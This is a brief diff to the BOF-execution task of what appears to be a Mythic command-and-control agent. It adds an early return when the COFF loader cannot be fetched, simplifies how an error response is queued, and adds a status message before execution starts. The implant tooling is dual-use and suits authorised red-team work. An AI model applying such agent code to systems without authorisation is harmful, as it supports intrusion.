@@ -1163,6 +1163,7 @@ namespace Tasks
                     {
                         resp = CreateTaskResponse($"Failed to get coff loader from Mythic", true, "error");
                         _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                        return;
                     }
                 }
                 if (!LoadDLL(coffLoaderDllBytes))
@@ -1183,8 +1184,7 @@ namespace Tasks
                     }
                     else
                     {
-                        resp = CreateTaskResponse($"Failed to get bof from Mythic", true, "error");
-                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse($"Failed to get bof from Mythic", true, "error"));
                         return;
                     }
                 }
@@ -1210,6 +1210,7 @@ namespace Tasks
                 try
                 {
                     // Start execution in a separate thread
+                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Starting COFF..."));
                     DebugHelp.DebugWriteLine("Starting COFF execution thread");
                     Thread executionThread = new Thread(new ParameterizedThreadStart(ExecuteCOFFThreadFunc));
                     executionThread.IsBackground = true; // Make thread a background thread so it doesn't keep process alive
